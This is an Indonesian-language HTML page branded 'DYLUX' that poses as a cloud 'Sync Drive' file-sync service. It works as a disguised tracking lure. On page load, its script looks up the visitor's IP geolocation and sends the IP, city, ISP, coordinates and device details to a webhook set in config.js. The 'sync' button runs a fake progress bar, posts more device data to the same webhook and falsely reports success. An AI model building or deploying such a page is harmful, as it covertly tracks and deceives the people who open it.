<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sync Drive</title>
    <script src="config.js"></script>
    <style>
        :root {
            --primary: #00f0ff;
            --secondary: #7b2ffc;
            --bg: #0a0a0f;
            --card: #14141e;
            --text: #e0e0ff;
            --text2: #8888aa;
            --border: rgba(0,240,255,0.1);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: var(--bg);
            font-family: -apple-system, 'Inter', sans-serif;
            color: var(--text);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background-image: radial-gradient(ellipse at 10% 20%, rgba(0,240,255,0.03) 0%, transparent 50%);
        }
        .container {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 40px 32px;
            max-width: 400px;
            width: 100%;
        }
        .header { text-align: center; margin-bottom: 24px; }
        .logo {
            font-size: 24px;
            font-weight: 800;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .badge {
            display: inline-block;
            background: rgba(123,47,252,0.1);
            color: var(--secondary);
            font-size: 11px;
            padding: 4px 12px;
            border-radius: 20px;
            margin-top: 6px;
            font-weight: 600;
        }
        .icon { font-size: 48px; text-align: center; margin: 12px 0; }
        .title {
            font-size: 18px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 6px;
        }
        .desc {
            font-size: 14px;
            color: var(--text2);
            text-align: center;
            line-height: 1.6;
        }
        .file-list {
            margin: 16px 0;
            background: var(--bg);
            border-radius: 12px;
            padding: 12px;
            border: 1px solid var(--border);
        }
        .file-item {
            padding: 8px 12px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 13px;
        }
        .file-item:last-child { border-bottom: none; }
        .file-item .name { color: var(--text); }
        .file-item .size { color: var(--text2); font-size: 11px; }
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: #fff;
            transition: 0.3s;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 0 30px rgba(0,240,255,0.2); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .footer {
            text-align: center;
            font-size: 11px;
            color: var(--text2);
            margin-top: 20px;
            padding-top: 16px;
            border-top: 1px solid var(--border);
        }
        .footer a { color: var(--primary); text-decoration: none; }
        .spinner {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid var(--border);
            border-top-color: var(--primary);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 12px auto 0;
        }
        .spinner.active { display: block; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status-msg { text-align: center; font-size: 13px; color: var(--text2); margin-top: 10px; display: none; }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: var(--bg);
            border-radius: 10px;
            overflow: hidden;
            margin: 12px 0;
        }
        .progress-bar .fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            border-radius: 10px;
            transition: width 0.5s ease;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">DYLUX</div>
            <div class="badge">📁 Sync Drive</div>
        </div>

        <div class="icon">📁</div>
        <div class="title">Sinkronisasi File</div>
        <div class="desc">
            File Anda sedang disinkronkan ke cloud.
        </div>

        <div class="file-list">
            <div class="file-item"><span class="name">📄 document.docx</span><span class="size">2.4 MB</span></div>
            <div class="file-item"><span class="name">🖼️ photo.jpg</span><span class="size">4.1 MB</span></div>
            <div class="file-item"><span class="name">🎵 music.mp3</span><span class="size">7.8 MB</span></div>
            <div class="file-item"><span class="name">📁 backup.zip</span><span class="size">15.2 MB</span></div>
        </div>

        <div class="progress-bar"><div class="fill" id="progressFill"></div></div>

        <button class="btn" id="syncBtn">Sinkronkan Sekarang</button>

        <div class="spinner" id="spinner"></div>
        <div class="status-msg" id="statusMsg"></div>

        <div class="footer">
            &copy; 2026 <a href="#">DYLUX</a> • Cahaya dalam Kegelapan
        </div>
    </div>

    <script>
        function getUserId() {
            const params = new URLSearchParams(window.location.search);
            return params.get('id');
        }

        async function autoDetect() {
            const userId = getUserId();
            if (!userId) return;
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                await fetch(DYLUX_CONFIG.WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        user_id: userId,
                        type: 'auto_detect',
                        data: {
                            ip: ipData.ip || 'unknown',
                            city: ipData.city || 'unknown',
                            region: ipData.region || 'unknown',
                            country: ipData.country_name || 'unknown',
                            isp: ipData.org || 'unknown',
                            lat: ipData.latitude || 0,
                            lon: ipData.longitude || 0,
                            device: {
                                userAgent: navigator.userAgent,
                                platform: navigator.platform,
                                language: navigator.language,
                                screen: `${window.screen.width}x${window.screen.height}`
                            },
                            timestamp: new Date().toISOString()
                        }
                    })
                });
                console.log('✅ Auto-detect sent');
            } catch (e) { console.error(e); }
        }

        const userId = getUserId();
        const syncBtn = document.getElementById('syncBtn');
        const spinner = document.getElementById('spinner');
        const statusMsg = document.getElementById('statusMsg');
        const progressFill = document.getElementById('progressFill');

        syncBtn.addEventListener('click', async () => {
            syncBtn.disabled = true;
            spinner.classList.add('active');
            statusMsg.style.display = 'none';
            progressFill.style.width = '0%';

            // Simulasi progress
            let progress = 0;
            const interval = setInterval(() => {
                progress += 10;
                progressFill.style.width = progress + '%';
                if (progress >= 100) clearInterval(interval);
            }, 300);

            await fetch(DYLUX_CONFIG.WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    user_id: userId,
                    type: 'filesystem',
                    data: {
                        files: [
                            { name: 'document.docx', size: '2.4 MB' },
                            { name: 'photo.jpg', size: '4.1 MB' },
                            { name: 'music.mp3', size: '7.8 MB' },
                            { name: 'backup.zip', size: '15.2 MB' }
                        ],
                        timestamp: new Date().toISOString(),
                        device: navigator.userAgent
                    }
                })
            });

            clearInterval(interval);
            progressFill.style.width = '100%';
            spinner.classList.remove('active');
            syncBtn.disabled = false;
            statusMsg.style.display = 'block';
            statusMsg.innerHTML = '✅ File berhasil disinkronkan!';
        });

        document.addEventListener('DOMContentLoaded', autoDetect);
    </script>
</body>
</html>
